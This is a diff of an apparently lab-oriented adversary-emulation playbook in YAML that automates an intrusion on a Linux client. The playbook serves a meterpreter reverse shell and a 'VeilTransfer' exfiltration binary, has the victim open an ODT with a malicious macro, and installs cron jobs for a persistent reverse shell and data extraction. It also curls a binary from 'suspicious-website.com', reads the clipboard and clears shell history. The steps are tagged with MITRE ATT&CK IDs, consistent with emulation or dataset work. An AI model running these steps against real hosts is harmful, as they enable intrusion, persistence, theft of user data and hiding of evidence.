@@ -1,5 +1,5 @@
 # Client opens an Open Office Document with a macro that download and executes payload
-# persistence via browser binary
+# persistence via cron job
 
 vars:
   PAYLOAD: linux/x64/meterpreter/reverse_tcp
@@ -16,7 +16,7 @@ vars:
 
 
 commands:
-  # establish ssh tunneling via mgmt host, everything sent to attacker port 5902 will be forwarded to client port 5901 (vnc)
+  # establish ssh tunneling via mgmt host, everything sent to attacker port 5902 will be forwarded to client port 5901 (vnc), i.e. 
   # ssh -i /home/aecid/.ssh/attacker -o StrictHostKeyChecking=no -L 5902:192.168.50.100:5901 aecid@192.42.0.201
 
 
@@ -27,8 +27,15 @@ commands:
     creates_session: tunnel
     cmd: "ssh -i /home/aecid/.ssh/attacker  -o StrictHostKeyChecking=no -L 5902:$CLIENT_IP:$CLIENT_VNC_PORT $MGMT_USERNAME@$MGMT_IP \n"
 
-################### SERVE THE METERPRETER PAYLOAD ############################
+################### SERVE VEILTRANSFER CLIENT ############################
 
+  # serve payload via http
+  - type: webserv
+    local_path: /home/aecid/VeilTransfer/veiltransfer_client_linux
+    port: 8082
+    background: True
+
+################### SERVE THE METERPRETER PAYLOAD ############################
 
   # tempfile for reverse shell payload
   - type: mktemp
@@ -56,14 +63,6 @@ commands:
     background: true
     kill_on_exit: true
 
-################### SERVE VEILTRANSFER CLIENT ############################
-
-  # serve payload via http
-  - type: webserv
-    local_path: /home/aecid/VeilTransfer/veiltransfer_client_linux
-    port: 8082
-    background: True
-
 ################### CLIENT OPENS DOCUMENT ############################
 
   - type: vnc
@@ -73,7 +72,7 @@ commands:
     port: 5902
     creates_session: client
 
-# Opening a terminal from the menu
+  # Opening a terminal from the menu
 
   - type: vnc
     cmd: move
@@ -104,7 +103,7 @@ commands:
   - type: sleep
     seconds: 3
 
-# copy something to the clipboard
+  # copy something to the clipboard
   - type: vnc 
     cmd: type 
     input: echo 'Dummy Text' | xclip -selection clipboard
@@ -121,20 +120,21 @@ commands:
   - type: sleep
     seconds: 3
 
-# Open the Document with the malicious macro
+  # Open the Document with the malicious macro
   - type: vnc 
     cmd: type 
     input: "soffice /home/judy/Nutzungshinweise.odt"
     session: client
+    metadata:
+      techniques: "T1204"
 
   - type: sleep
-    seconds: 3
+    seconds: 1
 
   - type: vnc
     cmd: key
     key: "enter"
     session: client
-
 
   - type: sleep
     seconds: 3
@@ -146,21 +146,21 @@ commands:
     session: revshell
     cmd: sysinfo
 
-################### PERSISTENCE OPTION A, CRON JOB ############################
+################### PERSISTENCE OPTION B, CRON JOB ############################
 
- # upload cronjob that establishes reverse shell
+  # upload cronjob that establishes reverse shell
   - type: msf-session
     session: revshell
     cmd: upload crontab.txt
 
- # upload cronjob that extracts data
+  # upload cronjob that extracts data
   - type: msf-session
     session: revshell
     cmd: upload downloader.txt
 
 ################### ATTACKER GATHERS INFORMATION ############################
 
- # get interactive shell
+  # get interactive shell
   - type: msf-session
     cmd: shell
     session: revshell
@@ -190,12 +190,14 @@ commands:
     cmd: curl -o /home/judy/.local/bin/veiltransfer_client_linux suspicious-website.com:8082/index
     session: revshell
 
-   # get the last clipboard entry
+  # get the last clipboard entry
   - type: msf-session
     session: revshell
     cmd: xclip -selection clipboard -o
+    metadata:
+      techniques: "T1515"
 
-# make the veiltransfer client binary executable
+  # make the veiltransfer client binary executable
   - type: msf-session
     session: revshell
     cmd: chmod +x /home/judy/.local/bin/veiltransfer_client_linux 
@@ -204,25 +206,33 @@ commands:
   - type: msf-session
     session: revshell 
     cmd: crontab /home/judy/crontab.txt
+    metadata:
+      techniques: "T1053"
 
   # add the cronjob to extract data
   - type: msf-session
     session: revshell
     cmd: (crontab -l; cat /home/judy/downloader.txt) | crontab -
+    metadata:
+      techniques: "T1029"
 
   # find out which windown are open
   - type: msf-session
     session: revshell
     cmd:  wmctrl -l
+    metadata:
+      techniques: "T010"
+
+  # clear history
+  - type: msf-session
+    session: revshell
+    cmd: history -c
+    metadata:
+      techniques: "T1565"
 
   # exit the interactive shell
   - type: msf-session
     session: revshell
     cmd: exit
-
-      # clear history
-  - type: msf-session
-    session: revshell
-    cmd: history -c
 
 
